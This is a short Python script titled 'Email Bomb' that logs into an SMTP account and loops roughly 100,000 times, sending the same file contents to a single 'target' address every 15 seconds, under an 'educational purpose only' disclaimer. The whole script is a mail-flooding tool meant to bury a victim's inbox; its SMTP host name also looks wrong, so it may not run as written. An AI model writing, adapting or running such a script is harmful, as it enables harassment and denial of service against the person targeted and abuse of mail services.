#-------------------------------------------------------------------------------
# Name:        Email Bomb
# Purpose:     Program to send unlimited emails - This is for educational purpose only
# Author:      rakesh  kumar
# Created:     11-02-2018
# Copyright:   rakesh kumar
# Licence:     MIT 
#-------------------------------------------------------------------------------
import time
import getpass
import smtplib
from email.mime.text import MIMEText
# Open a plain text file for reading.  For this example, assume that
# the text file contains only ASCII characters.
textfile ="abcd.txt"
fp = open(textfile, 'r')
# Create a text/plain message
msg = MIMEText(fp.read())
fp.close()

me ='email@google.com'
target = 'target@gmail.com'

msg['Subject'] = 'The contents of %s' % textfile
msg['From'] = me
msg['To'] = target
password = getpass.getpass("Enter your email ID password  : ")
for i in range (1,100000):
    connection = smtplib.SMTP_SSL('smtp.google.com',465)
    connection.ehlo()
    #connection.starttls()
    connection.login('email@google.com',password)
    connection.sendmail(me,[target],msg.as_string())
    connection.quit()
    time.sleep(15)